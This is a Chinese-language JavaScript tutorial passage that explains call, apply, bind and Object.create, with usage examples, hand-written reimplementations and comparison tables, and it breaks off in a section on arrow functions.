                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">引言</h4>
<p>在 JavaScript 开发中，我们经常需要处理函数执行上下文（this 指向）和对象原型链。<code>call</code>、<code>apply</code>、<code>bind</code> 和 <code>Object.create</code> 是四个至关重要的原生方法，理解它们的原理和实现方式，不仅有助于我们编写更优雅的代码，也是进阶 JavaScript 开发的必经之路。</p>
<p>本文将深入探讨这四个方法的核心原理，并提供完整的手写实现。通过自己实现这些方法，我们可以更好地理解 JavaScript 底层的工作机制。</p>
<h4 data-id="heading-1">一、call 方法</h4>
<h5 data-id="heading-2">1.1 基本概念</h5>
<p><code>call()</code> 方法使用一个指定的 <code>this</code> 值和单独给出的一个或多个参数来调用一个函数。
语法：</p>
<pre><code class="hljs language-javascript" lang="javascript">func.<span class="hljs-title function_">call</span>(thisArg, arg1, arg2, ...)
</code></pre>
<h5 data-id="heading-3">1.2 原生使用示例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">message, punctuation</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${message}</span>, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span><span class="hljs-subst">${punctuation}</span>`</span>);
}

<span class="hljs-keyword">const</span> person = { <span class="hljs-attr">name</span>: <span class="hljs-string">"Alice"</span> };

<span class="hljs-comment">// 使用 call 改变 this 指向</span>
greet.<span class="hljs-title function_">call</span>(person, <span class="hljs-string">"Hello"</span>, <span class="hljs-string">"!"</span>); <span class="hljs-comment">// 输出: Hello, Alice!</span>
</code></pre>
<h5 data-id="heading-4">1.3 手写实现</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myCall</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context = globalThis, ...args</span>) {
  <span class="hljs-comment">// 确保 context 是对象(如果不是, 转换为对象包装)</span>
  context = <span class="hljs-title class_">Object</span>(context);

  <span class="hljs-comment">// 使用 Symbol 创建唯一键，避免属性冲突</span>
  <span class="hljs-keyword">const</span> fnKey = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">"fn"</span>);

  <span class="hljs-comment">// 将当前函数作为 context 的方法</span>
  context[fnKey] = <span class="hljs-variable language_">this</span>;

  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 执行函数</span>
    <span class="hljs-keyword">return</span> context[fnKey](...args);
  } <span class="hljs-keyword">finally</span> {
    <span class="hljs-comment">// 确保删除临时添加的方法</span>
    <span class="hljs-keyword">delete</span> context[fnKey];
  }
};

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">showInfo</span>(<span class="hljs-params">label</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${label}</span>: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> - <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span>`</span>);
}

<span class="hljs-keyword">const</span> user = { <span class="hljs-attr">name</span>: <span class="hljs-string">"John"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> };
showInfo.<span class="hljs-title function_">myCall</span>(user, <span class="hljs-string">"用户信息"</span>); <span class="hljs-comment">// 输出: 用户信息: John - 25</span>
</code></pre>
<h5 data-id="heading-5">1.4 实现解析</h5>
<ol>
<li><strong>参数处理:</strong> 第一个参数是 <code>thisArg</code>，后续参数是传递给函数的参数</li>
<li><strong>上下文绑定:</strong> 将函数临时添加到目标对象上</li>
<li><strong>函数执行:</strong> 使用目标对象调用函数</li>
<li><strong>清理工作:</strong> 删除临时添加的属性，避免污染目标对象</li>
</ol>
<h4 data-id="heading-6">二、apply 方法</h4>
<h5 data-id="heading-7">2.1 基本概念</h5>
<p><code>apply()</code> 方法调用一个具有给定 <code>this</code> 值的函数，以及以一个数组（或类数组对象）的形式提供的参数。
语法:</p>
<pre><code class="hljs language-javascript" lang="javascript">func.<span class="hljs-title function_">apply</span>(thisArg, argsArray)
</code></pre>
<h5 data-id="heading-8">2.2原生使用示例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a, b, c</span>) {
  <span class="hljs-keyword">return</span> a + b + c;
}

<span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];

<span class="hljs-comment">// 使用 apply 传递数组参数</span>
<span class="hljs-keyword">const</span> result = sum.<span class="hljs-title function_">apply</span>(<span class="hljs-literal">null</span>, numbers); <span class="hljs-comment">// 6</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);
</code></pre>
<h5 data-id="heading-9">2.3 手写实现</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myApply</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context = globalThis, argsArray</span>) {
  <span class="hljs-comment">// 处理 context</span>
  context = <span class="hljs-title class_">Object</span>(context);

  <span class="hljs-comment">// 如果 argsArray 不是数组或类数组, 则当作空数组处理</span>
  <span class="hljs-keyword">if</span> (
    !<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(argsArray) &amp;&amp;
    !(argsArray &amp;&amp; <span class="hljs-keyword">typeof</span> argsArray === <span class="hljs-string">"object"</span> &amp;&amp; <span class="hljs-string">"length"</span> <span class="hljs-keyword">in</span> argsArray)
  ) {
    argsArray = [];
  }

  <span class="hljs-comment">// 创建唯一键</span>
  <span class="hljs-keyword">const</span> fnKey = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">"fn"</span>);

  <span class="hljs-comment">// 将函数绑定到 context</span>
  context[fnKey] = <span class="hljs-variable language_">this</span>;

  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 执行函数，使用展开运算符传递参数</span>
    <span class="hljs-keyword">return</span> context[fnKey](...argsArray);
  } <span class="hljs-keyword">finally</span> {
    <span class="hljs-comment">// 清理</span>
    <span class="hljs-keyword">delete</span> context[fnKey];
  }
};

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">calculate</span>(<span class="hljs-params">operation, ...numbers</span>) {
  <span class="hljs-keyword">const</span> ops = {
    <span class="hljs-attr">sum</span>: <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b,
    <span class="hljs-attr">product</span>: <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a * b,
  };

  <span class="hljs-keyword">return</span> numbers.<span class="hljs-title function_">reduce</span>(ops[operation]);
}

<span class="hljs-keyword">const</span> nums = [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>];
<span class="hljs-keyword">const</span> sumResult = calculate.<span class="hljs-title function_">myApply</span>(<span class="hljs-literal">null</span>, [<span class="hljs-string">"sum"</span>, ...nums]);
<span class="hljs-keyword">const</span> productResult = calculate.<span class="hljs-title function_">myApply</span>(<span class="hljs-literal">null</span>, [<span class="hljs-string">"product"</span>, ...nums]);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Sum: "</span>, sumResult); <span class="hljs-comment">// 输出: Sum:  9</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Product: "</span>, productResult); <span class="hljs-comment">// 输出: Product:  24</span>
</code></pre>
<h5 data-id="heading-10">2.4 <code>Call</code> vs <code>Apply</code> 的区别</h5>
<p>2.4 call vs apply 的区别</p>























<table><thead><tr><th align="left">特性</th><th align="left">参数传递</th><th align="left">性能</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">Call</td><td align="left">逐个传递</td><td align="left">通常稍快</td><td align="left">参数数量已知</td></tr><tr><td align="left">Apply</td><td align="left">数组形式传递</td><td align="left">需要处理数组</td><td align="left">参数数量动态或已存在数组中</td></tr></tbody></table>
<h4 data-id="heading-11">三、bind 方法</h4>
<h5 data-id="heading-12">3.1 基本概念</h5>
<p><code>bind()</code> 方法创建一个新的函数，在 <code>bind()</code> 被调用时，这个新函数的 <code>this</code> 被指定为 <code>bind()</code> 的第一个参数，而其余参数将作为新函数的参数，供调用时使用。
语法:</p>
<pre><code class="hljs language-javascript" lang="javascript">func.<span class="hljs-title function_">bind</span>(thisArg[, arg1[, arg2[, ...]]])
</code></pre>
<h5 data-id="heading-13">3.2 原生使用示例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> module1 = {
  <span class="hljs-attr">x</span>: <span class="hljs-number">42</span>,
  <span class="hljs-attr">getX</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>;
  },
};

<span class="hljs-keyword">const</span> unboundGetX = module1.<span class="hljs-property">getX</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">unboundGetX</span>()); <span class="hljs-comment">// undefined (this 指向全局对象)</span>

<span class="hljs-keyword">const</span> boundGetX = unboundGetX.<span class="hljs-title function_">bind</span>(module1);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">boundGetX</span>()); <span class="hljs-comment">// 42</span>

</code></pre>
<h5 data-id="heading-14">3.3 手写实现</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myBind</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context, ...bindArgs</span>) {
  <span class="hljs-comment">// 保存原函数</span>
  <span class="hljs-keyword">const</span> originalFunc = <span class="hljs-variable language_">this</span>;

  <span class="hljs-comment">// 判断是否是构造函数</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> originalFunc !== <span class="hljs-string">"function"</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"Function.prototype.bind called on non-function"</span>);
  }

  <span class="hljs-comment">// 返回的绑定函数</span>
  <span class="hljs-keyword">const</span> boundFunc = <span class="hljs-keyword">function</span> (<span class="hljs-params">...callArgs</span>) {
    <span class="hljs-comment">// 判断是否通过 new 调用</span>
    <span class="hljs-comment">// 通过 new 调用时, this 应该是 boundFunc 的实例</span>
    <span class="hljs-keyword">const</span> isNewCall = <span class="hljs-variable language_">this</span> <span class="hljs-keyword">instanceof</span> boundFunc;

    <span class="hljs-comment">// 确定执行上下文</span>
    <span class="hljs-keyword">const</span> thisContext = isNewCall ? <span class="hljs-variable language_">this</span> : <span class="hljs-title class_">Object</span>(context || globalThis);

    <span class="hljs-comment">// 合并参数</span>
    <span class="hljs-keyword">const</span> allArgs = bindArgs.<span class="hljs-title function_">concat</span>(callArgs);

    <span class="hljs-comment">// 调用原函数</span>
    <span class="hljs-keyword">return</span> originalFunc.<span class="hljs-title function_">apply</span>(thisContext, allArgs);
  };

  <span class="hljs-comment">// 维护原型链</span>
  <span class="hljs-keyword">if</span> (originalFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) {
    <span class="hljs-comment">// 使用 Object.create 来创建原型链, 避免直接修改</span>
    boundFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(originalFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
    <span class="hljs-comment">// 修正 constructor 指向</span>
    boundFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = boundFunc;
  }

  <span class="hljs-comment">// 保留原函数的 length 属性(可选, 非标准)</span>
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 计算绑定函数的 length 属性(原函数参数个数 - 绑定的参数个数)</span>
    <span class="hljs-keyword">const</span> originalLength = originalFunc.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> bindArgsLength = bindArgs.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> remainingArgs = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(originalLength - bindArgsLength, <span class="hljs-number">0</span>);

    <span class="hljs-comment">// 使用 Object.defineProperty 来定义不可枚举的 length 属性</span>
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(boundFunc, <span class="hljs-string">"length"</span>, {
      <span class="hljs-attr">value</span>: remainingArgs,
      <span class="hljs-attr">writable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
    });
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-comment">// 忽略错误</span>
  }

  <span class="hljs-comment">// 保留原函数的 name 属性(可选)</span>
  <span class="hljs-keyword">try</span> {
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(boundFunc, <span class="hljs-string">"name"</span>, {
      <span class="hljs-attr">value</span>: <span class="hljs-string">`bound <span class="hljs-subst">${originalFunc.name || <span class="hljs-string">""</span>}</span>`</span>,
      <span class="hljs-attr">writable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
    });
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-comment">// 忽略错误</span>
  }

  <span class="hljs-keyword">return</span> boundFunc;
};

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}

<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">introduce</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old.`</span>);
};

<span class="hljs-comment">// 创建绑定函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">BoundPerson</span> = <span class="hljs-title class_">Person</span>.<span class="hljs-title function_">myBind</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">"Alice"</span>);
<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BoundPerson</span>(<span class="hljs-number">25</span>); <span class="hljs-comment">// 使用 new 调用</span>
person.<span class="hljs-title function_">introduce</span>(); <span class="hljs-comment">// 输出: Hi, I'm Alice, 25 years old.</span>

<span class="hljs-comment">// 普通绑定使用</span>
<span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">x</span>: <span class="hljs-number">10</span> };
<span class="hljs-keyword">function</span> <span class="hljs-title function_">multiply</span>(<span class="hljs-params">y</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> * y;
}

<span class="hljs-keyword">const</span> boundMultiply = multiply.<span class="hljs-title function_">myBind</span>(obj);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">boundMultiply</span>(<span class="hljs-number">5</span>)); <span class="hljs-comment">// 输出: 50</span>

</code></pre>
<h5 data-id="heading-15">3.4 <code>bind</code>的特殊之处</h5>
<ol>
<li><strong>部分应用:</strong> 可以预先绑定部分参数</li>
<li><strong>构造函数支持:</strong> 绑定后的函数可以作为构造函数使用</li>
<li><strong>延迟执行:</strong> 返回新函数，不会立即执行</li>
</ol>
<h4 data-id="heading-16">四、Object.create 方法</h4>
<h5 data-id="heading-17">4.1 基本概念</h5>
<p><code>Object.create()</code>方法创建一个新对象，使用现有的对象作为新创建对象的原型。
语法:</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto[, propertiesObject])
</code></pre>
<h5 data-id="heading-18">4.2 原生使用示例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 创建一个原型为 null 的对象</span>
<span class="hljs-keyword">const</span> obj1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj1.<span class="hljs-property">toString</span>); <span class="hljs-comment">// undefined</span>

<span class="hljs-comment">// 使用原型创建对象</span>
<span class="hljs-keyword">const</span> person = {
  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  },
};

<span class="hljs-keyword">const</span> john = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(person);
john.<span class="hljs-property">name</span> = <span class="hljs-string">"John"</span>;
john.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// 输出: Hello, John</span>
</code></pre>
<h5 data-id="heading-19">4.3 手写实现</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-property">myCreate</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">proto, propertiesObject</span>) {
  <span class="hljs-comment">// 参数校验</span>
  <span class="hljs-keyword">if</span> (
    proto !== <span class="hljs-literal">null</span> &amp;&amp;
    <span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">"object"</span> &amp;&amp;
    <span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">"function"</span>
  ) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"Object prototype may only be an Object or null"</span>);
  }

  <span class="hljs-comment">// 创建一个临时构造函数</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">TempFunc</span>(<span class="hljs-params"/>) {}

  <span class="hljs-comment">// 设置构造函数的原型</span>
  <span class="hljs-title class_">TempFunc</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = proto;

  <span class="hljs-comment">// 创建新实例</span>
  <span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TempFunc</span>();

  <span class="hljs-comment">// 如果 proto 是 null, 手动设置原型为 null</span>
  <span class="hljs-keyword">if</span> (proto === <span class="hljs-literal">null</span>) {
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, <span class="hljs-literal">null</span>);
  }

  <span class="hljs-comment">// 处理第二个参数: 属性描述符</span>
  <span class="hljs-keyword">if</span> (propertiesObject !== <span class="hljs-literal">undefined</span>) {
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperties</span>(obj, propertiesObject);
  }

  <span class="hljs-keyword">return</span> obj;
};

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">const</span> animal = {
  <span class="hljs-title function_">makeSound</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">sound</span> || <span class="hljs-string">"Some sound"</span>);
  },
};

<span class="hljs-comment">// 创建继承自 animal 的对象</span>
<span class="hljs-keyword">const</span> dog = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">myCreate</span>(animal, {
  <span class="hljs-attr">sound</span>: {
    <span class="hljs-attr">value</span>: <span class="hljs-string">"Woof!"</span>,
    <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,
  },
  <span class="hljs-attr">breed</span>: {
    <span class="hljs-attr">value</span>: <span class="hljs-string">"Labrador"</span>,
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,
  },
});

dog.<span class="hljs-title function_">makeSound</span>(); <span class="hljs-comment">// 输出: Woof!</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog.<span class="hljs-property">breed</span>); <span class="hljs-comment">// 输出: Labrador</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(dog) === animal); <span class="hljs-comment">// 输出: true</span>

</code></pre>
<h5 data-id="heading-20">4.4 <code>Object.create</code>的应用场景</h5>
<ol>
<li><strong>原型继承:</strong> 实现对象之间的继承关系</li>
<li><strong>纯净对象:</strong> 创建没有原型链的对象(<code>Object.create(null)</code>)</li>
<li><strong>属性定义:</strong> 同时定义多个属性及其特性</li>
</ol>
<h4 data-id="heading-21">五、综合应用与对比</h4>
<h5 data-id="heading-22">5.1 实现一个完整的继承系统</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 父类</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> is eating.`</span>);
};

<span class="hljs-comment">// 子类</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name, breed</span>) {
  <span class="hljs-comment">// 使用 call 继承属性</span>
  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = breed;
}

<span class="hljs-comment">// 使用 Object.create 继承原型</span>
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">myCreate</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Dog</span>;

<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> (<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.breed}</span> says: Woof!)`</span>);
};

<span class="hljs-comment">// 使用 bind 创建特定行为</span>
<span class="hljs-keyword">const</span> sleepyEat = <span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span>.<span class="hljs-title function_">bind</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"Sleepy"</span> });

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">const</span> myDog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">"Buddy"</span>, <span class="hljs-string">"Golden Retriever"</span>);
myDog.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// 输出: Buddy is eating.</span>
myDog.<span class="hljs-title function_">bark</span>(); <span class="hljs-comment">// 输出: Buddy (Golden Retriever says: Woof!)</span>
<span class="hljs-title function_">sleepyEat</span>(); <span class="hljs-comment">// 输出: Sleepy is eating.</span>
</code></pre>
<h5 data-id="heading-23">5.2 四种方法对比总结</h5>



































<table><thead><tr><th align="left">方法</th><th align="left">作用</th><th align="left">返回值</th><th align="left">是否立即执行</th></tr></thead><tbody><tr><td align="left">call</td><td align="left">改变函数this指向并立即调用</td><td align="left">函数返回值</td><td align="left">是</td></tr><tr><td align="left">apply</td><td align="left">改变函数this指向并以数组传参调用</td><td align="left">函数返回值</td><td align="left">是</td></tr><tr><td align="left">bind</td><td align="left">创建新的绑定函数</td><td align="left">新函数</td><td align="left">否</td></tr><tr><td align="left">Object.create</td><td align="left">创建指定原型的对象</td><td align="left">新对象</td><td align="left">-</td></tr></tbody></table>
<h5 data-id="heading-24">5.3 性能考虑</h5>
<ol>
<li><strong>call/apply:</strong> 频繁使用会影响性能(每次都要创建/删除属性)</li>
<li><strong>bind:</strong> 适合重复调用的场景，只需绑定一次</li>
<li><strong>Object.create:</strong> 比<code>new Constructor()</code>更轻量，适合纯原型继承</li>
</ol>
<h4 data-id="heading-25">六、现代 JavaScript 中的替代方案</h4>
<h5 data-id="heading-26">6.1 箭头函数</h5>
<p>箭头函数没有自己的<code>this</code>，会捕获其所在上下文的<code>this</code>值。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 传统方式</span>
<span class="hljs-keyword">const</span> obj1 = {
  <span class="hljs-attr">value</span>: <span class="hljs-number">10</span>,
  <span class="hljs-attr">getValue</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;
  }.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>),
};

<span class="hljs-comment">// 箭头函数方式</span>
<span class="hljs-keyword">const</span> obj2 = {
